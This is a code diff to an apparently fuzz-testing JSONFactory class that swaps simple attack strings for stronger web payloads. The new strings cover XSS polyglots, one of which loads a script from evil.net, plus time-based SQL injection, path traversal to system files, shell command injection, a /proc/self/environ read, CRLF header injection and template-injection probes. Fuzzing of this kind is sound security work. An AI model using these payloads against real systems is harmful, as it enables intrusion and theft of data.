@@ -213,19 +213,22 @@ class JSONFactory:
             5: lambda x: "&#%d;" % ord(x),
         }
         attacks = {
-            0: "javascript:alert(0);//",
-            1: "http://",
-            2: "/../../../../etc/passwd",
-            3: "'or'1\"or'=\"'1--",
-            4: "'\"><img src=0>",
-            5: "||calc.exe&&id||whoami",
-            6: "C:\\..\\",
-            7: "--><img src=0>",
-            8: "\"';]//)}//",
-            9: ".\\",
+            0: "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/"
+               "</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+            1: "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF"
+               "(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR\"*/ FROM some_table WHERE ex = ample",
+            2: "/../../../../etc/issue",
+            3: "SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/",
+            4: "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),"
+               "s.stack=Error().stack,s.src=(/,/+/evil.net/).slice(2),document.documentElement.appendChild(s))//'>",
+            5: "&sleep 5&'\\\"`0&sleep 5&`'",
+            6: "..\\..\\..\\..\\boot.ini",
+            7: "data:text/html,https://a:a.it@www.\\it",
+            8: "file:///proc/self/environ",
+            9: "\\x0d\\xa0BB: mail@mail.it\\x0d\\x0aLocation: www.google.it",
             10: "./",
-            11: "{${AAA}}",
-            12: "{{13*37}}",
+            11: "${7*7}a{{bar}}b",
+            12: "{{'7'*7}}",
         }
         to_fuzz = attacks[random.randint(0, 6 + self.fuzz_factor)] + to_fuzz
         p1 = subprocess.Popen(['/bin/echo', to_fuzz], stdout=subprocess.PIPE)
